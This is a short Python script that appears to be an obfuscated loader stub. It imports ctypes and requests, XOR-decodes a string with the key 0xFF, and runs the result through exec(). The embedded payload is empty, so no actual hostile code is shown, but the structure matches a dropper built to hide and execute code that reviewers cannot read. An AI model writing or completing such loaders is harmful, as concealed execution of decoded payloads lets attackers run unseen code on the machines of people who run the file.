import ctypes as kk
import requests as rr

Y = 0xFF
def cu(en):
    ded = ""
    for char in en:
        ded += chr(ord(char) ^ Y)  
    return ded

en=""" """

de = cu(en)


exec(de)